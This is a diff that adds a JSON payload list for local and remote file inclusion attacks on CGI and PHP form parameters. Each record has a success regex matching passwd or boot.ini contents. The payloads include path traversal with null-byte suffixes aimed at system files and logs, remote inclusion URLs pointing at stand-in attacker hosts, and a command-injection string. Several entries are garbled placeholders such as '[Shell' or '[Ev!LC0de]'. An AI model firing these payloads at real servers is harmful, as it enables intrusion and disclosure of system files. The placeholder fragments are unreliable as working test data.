@@ -1,0 +1,178 @@
+[
+  {
+    "payload_id": "OWP-56730",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "CGI",
+    "injection_point": "form_parameter",
+    "payload_string": "../../../home/user/foo.pl\u0000",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0|boot.ini"
+    }
+  },
+  {
+    "payload_id": "OWP-58391",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "http://www.attacker.com",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0|boot.ini"
+    }
+  },
+  {
+    "payload_id": "OWP-59047",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "[Shell",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0|boot.ini"
+    }
+  },
+  {
+    "payload_id": "OWP-59199",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "[LocalFile]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0|boot.ini"
+    }
+  },
+  {
+    "payload_id": "OWP-61211",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "[Ev!LC0de]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0|boot.ini"
+    }
+  },
+  {
+    "payload_id": "OWP-61369",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "../../../../../../../../../../../../../var/log/httpd-error.log\u0000.txt",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0|boot.ini"
+    }
+  },
+  {
+    "payload_id": "OWP-61595",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "./.././../mpnews.ini",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0|boot.ini"
+    }
+  },
+  {
+    "payload_id": "OWP-62144",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "http://ursite/evilscript.txt?cmd",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0|boot.ini"
+    }
+  },
+  {
+    "payload_id": "OWP-62345",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "[Attack",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0|boot.ini"
+    }
+  },
+  {
+    "payload_id": "OWP-62644",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "/../../KedAns",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0|boot.ini"
+    }
+  },
+  {
+    "payload_id": "OWP-62645",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "../../KedAns",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0|boot.ini"
+    }
+  },
+  {
+    "payload_id": "OWP-62973",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "../../../../../../../../boot.ini\u0000.jpg",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0|boot.ini"
+    }
+  },
+  {
+    "payload_id": "OWP-63042",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": ";id;pwd",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0|boot.ini"
+    }
+  },
+  {
+    "payload_id": "OWP-63659",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "[Evil_url]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0|boot.ini"
+    }
+  },
+  {
+    "payload_id": "OWP-63954",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "http://evil_script",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0|boot.ini"
+    }
+  },
+  {
+    "payload_id": "OWP-64673",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "PHP",
+    "injection_point": "form_parameter",
+    "payload_string": "../test",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0|boot.ini"
+    }
+  }
+]
